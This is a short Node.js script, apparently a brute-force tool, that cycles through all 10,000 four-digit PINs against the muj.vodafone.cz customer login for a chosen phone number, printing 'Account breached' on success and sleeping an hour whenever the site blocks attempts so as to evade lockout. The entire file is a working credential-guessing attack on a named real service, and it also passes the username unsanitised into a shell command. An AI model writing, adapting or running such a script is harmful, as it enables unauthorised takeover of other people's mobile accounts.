const leftPad = require('left-pad')
const sleep = require('sleep').sleep
const execSync = require('child_process').execSync
var argv = require('yargs').argv

console.log(new Date()+': Started muj.vodafone.cz breach for number '+argv.username)

const BLOCKED_TIMEOUT = 60 * 60

var range = [...Array(10000).keys()]
// var range = [5208, 5209, 5210, 5211]

for (var i = 0; i < 10000; i++) {
  var password = range[i]
  var password = leftPad(password, 4, '0')
  console.log('Try password '+password)

  var execResult = execSync('casperjs login.js --username='+argv.username+' --password='+password)
  var result = JSON.parse(execResult.toString('utf-8'))

  if (result.acc != undefined) {
    console.log('Account breached, the password is '+password)
    process.exit()
  }
  if (RegExp('\\bzablokovali\\b').test(result.msg)) {
    console.log(new Date()+'Request blocked, try again in '+BLOCKED_TIMEOUT+' s')
    i--
    sleep(BLOCKED_TIMEOUT)
  }
}
